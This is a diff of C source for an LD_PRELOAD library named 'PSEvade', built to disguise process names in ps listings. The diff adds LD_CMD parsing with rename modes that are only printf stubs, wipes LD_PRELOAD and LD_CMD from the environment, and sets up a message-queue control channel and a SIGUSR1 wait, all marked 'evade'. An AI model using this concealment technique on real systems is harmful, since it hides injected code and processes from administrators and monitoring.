@@ -15,7 +15,8 @@
 
 //#include <dlfcn.h>
 
-#define MAX_MESG 128
+
+// ------------------------------------------------------------------------- //
 /*
 
 # PSEvade SO
@@ -43,11 +44,12 @@ intact values in:
 	Does not affect others:
 	(e.g. lsof -p pid ) 
 
-
 */
 
 
-/* We have to grab and save argv/argc pointers globally
+// ------------------------------------------------------------------------- //
+/* 
+	We have to grab and save argv/argc pointers globally
 	so they are visible for update
 	Provision for shim commands
 */
@@ -56,7 +58,10 @@ char ** largv = NULL;
 int     largc;
 char ** lenvp = NULL;
 char ** commands = NULL;
+int     cargc;
 char ** noncommands = NULL;
+
+#define MAX_MESG 128
 
 // structure and indetifiers for message queue 
 struct mesg_buffer {
@@ -66,6 +71,7 @@ struct mesg_buffer {
 
 int msgid;
 key_t key;
+
 
 void setRandezvous(void){
 
@@ -79,12 +85,13 @@ void setRandezvous(void){
    msgid = msgget(key, 0666 | IPC_CREAT);
    if (msgid < 0){
 		fprintf(stderr, "%d: %s\n", errno, strerror(errno));
-   }
-   printf("pid:%d, key:0x%x, msqid:%d\n", getpid(), key, msgid);
-
+   }else{
+   	printf("pid:%d, key:0x%x, msqid:%d\n", getpid(), key, msgid);
+	}
 }
-void SetProcessName(void){
 
+
+void SetProcessName(void){
 
     // msgrcv to receive message 
    msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT);
@@ -160,6 +167,8 @@ void cleanEnv(void){
 #endif
       if (strncmp(*lenvp, "LD_PRELOAD=", 11) == 0)
         memset(*lenvp, 0, strlen(*lenvp));
+      if (strncmp(*lenvp, "LD_CMD=", 7) == 0)
+        memset(*lenvp, 0, strlen(*lenvp));
 
       lenvp++;
     }
@@ -168,8 +177,11 @@ void cleanEnv(void){
 	 unsetenv("LD_PRELOAD"); 
 }
 
+
+
+
 // Used to accept argv arguments that may be interpreted as commands.
-void checkCommands(void){
+int OLDcheckCommands(void){
 
 	int  c = 0;
 	int  n = 0;
@@ -232,6 +244,7 @@ void checkCommands(void){
      }
 	}
 
+#ifdef PSDEBUG
 	if (n > 0){
    	printf("Non-Command args: \n");
 		for( int i = 0; i < n; ++i) {
@@ -245,6 +258,41 @@ void checkCommands(void){
 			  printf("\t%d) \"%s\"\n", i, commands[i]);
 		}
 	}
+#endif
+
+	cargc=c;
+	return cargc;
+}
+
+int processCommands(void){
+
+	char *cmds = NULL;
+	char *cmd, *key, *val;
+
+	if ( (cmds = (char*) getenv("LD_CMD")) == NULL ){
+		printf("Invalid LD_CMD");
+	   return 0;
+
+	}else{
+		printf("LD_CMDi: %s\n", cmds);
+
+		cmd = strdup(cmds); 
+		key = strtok(cmd, ":");
+		val = strtok(NULL, ":");
+		printf("%s => %s\n", key, val);
+
+		if ( strcmp(key, "r") == 0 ){
+				printf("imediate rename to static(%s)\n", val);
+		} else if ( strcmp(key, "R") == 0 ){
+				printf("delayed rename to static(%s)\n", val);
+		} else if ( strcmp(key, "M") == 0 ){
+				printf("delayed rename to dynamic (method: %s)\n", val);
+		} else {
+				printf("unsupported: %s\n", key);
+		}
+	}
+
+	return 1;
 }
 
 // Constructor called by ld.so before the main. This is not guaranteed but works.
@@ -264,16 +312,17 @@ __attribute__((constructor)) static void myctor(int argc, char **argv, char** en
     }
 #endif
 
-	 checkCommands();
+	 if (processCommands() > 0){
 
-	 // clean LD_PRELOAD pointers
+		 // evade: establish control channel
+		 setRandezvous();
+
+		 // evade: wait for external command
+		 signal(SIGUSR1, sig_handler); 
+	 }
+
+	 // always evade: clean LD_PRELOAD pointers
 	 cleanEnv();
-
-	 // establish control channel
-	 setRandezvous();
-
-	 // May want to wait for external conditon before renaming  
-	 signal(SIGUSR1, sig_handler); 
 
 }
 
